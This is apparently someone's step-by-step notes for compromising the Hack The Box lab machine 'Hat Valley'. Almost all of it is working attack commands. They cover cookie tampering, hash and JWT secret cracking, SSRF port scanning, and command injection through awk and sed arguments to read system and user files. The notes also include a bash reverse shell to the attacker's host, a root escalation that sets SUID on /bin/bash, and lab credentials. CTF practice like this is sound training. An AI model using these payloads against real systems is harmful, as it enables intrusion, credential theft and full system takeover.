ping 10.10.11.185
whatweb 10.10.11.185

echo "10.10.11.185 hat-valley.htb" >> /etc/hosts

nmap -p- --min-rate 10000 hat-valley.htb

ffuf -c -w '/root/Downloads/Tools/subdomains-top1million-5000.txt' -u http://hat-valley.htb -H "Host: FUZZ.hat-valley.htb" --fs 132 -> get store

echo "10.10.11.185 store.hat-valley.htb" >> /etc/hosts
access store.hat-valley.htb -> need password
ignore for while

access webpage -> page source -> js/app.js
/api/get_all, /api/login, /api/staff_details, /api/store_status

on hat-valley.htb/hr, login page
on cookie editor, change "token=guest" to "token=admin"

enter admin page
access hat-valley.htb/api/staff-details -> get error
on cookie editor, remove "token" -> get accounts with password
copy passwords and access crack station -> try to crack hashes

christopher.jones:chris123
come bakc to hat-valley.htb/hr page and login on chris
on cookie editor, copy JWT token

crack jwt (https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py)
python3 jwt2john.py <token found> > jwt-hash.txt
john -w=../rockyou.txt jwt-hash.txt
jwt-hash:123beany123

ssrf
http://hat-valley.htb/dashboard/api/store-status?url='http://hat-valley.htb'

ffuf -c -w ../4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url="http://hat-valley.htb:FUZZ"' -fs 0 -> get ports 80, 3002 and 8080

port 3002 - api info
on /api/all-leave, awk command is vulnerable

go to jwt.io
with secret "123beany123", make other jwt token change the username to:
"/' /etc/passwd '" -> Bean and Christine
curl http://hat-valley.htb/api/all-leave --header "Cookie: token=<generated cookie>"

"/' /home/bean/.bashrc '" -> backup script

"/' /home/bean/Documents/backup_home.sh '" -> get bean_backup_final.tar.gz

"/' /home/bean/Documents/backup/bean_backup_final.tar.gz '"
curl http://hat-valley.htb/api/all-leave --header "Cookie: token=<generated cookie>" --output bean_backup_final.zip

extract bean_backup_final.zip, extract bean_backup_final.tar.gz
cd bean_backup_final

cat .config/xpad/content-DS1ZS1
bean.hill:014mrbeanrules!#P
ssh bean@hat-valley.htb
type password
get user.txt

sudo -l -> nothing
cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1 -> password isn't crackble - use bean password

access store.hat-valley.htb -> login admin:014mrbeanrules!#P

rce (https://gtfobins.github.io/gtfobins/sed/)
nano /tmp/surprise.sh
------------------------------------------------------------
#!/bin/bash
bash -i >& /dev/tcp/<kali ip>/<port> 0>&1
------------------------------------------------------------
chmod +x /tmp/surprise.sh

access store and add one item in cart
go to cart page -> don't reload the page
cd /cart
ls

rm -rf <number name file>
nano <same number name file>
------------------------------------------------------------
***Hat Valley Cart***
item_id=1' -e "1e /tmp/surprise.sh" /tmp/surprise.sh '&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
------------------------------------------------------------

nc -nvlp <port>

start burp suite intecepting -> access site again on cart page -> remove product
on burp, replace in "item" parameter:
item=1'+-e+"1e+/tmp/surprise.sh"+/tmp/shsurpriseell.sh+'&user=<your user number>&action=delete_item
send and get reverse www-data shell

run pspy64
inotifywait is monitoring
echo "test" >> leave_request.csv -> test the monitoring

get root (https://gtfobins.github.io/gtfobins/mail/)
nano /tmp/root.sh
------------------------------------------------------------
#!/bin/bash
chmod +s /bin/bash
------------------------------------------------------------
chmod +x /tmp/root.sh

echo '" --exec="\!/tmp/root.sh"' >> leave_requests.csv
get root.txt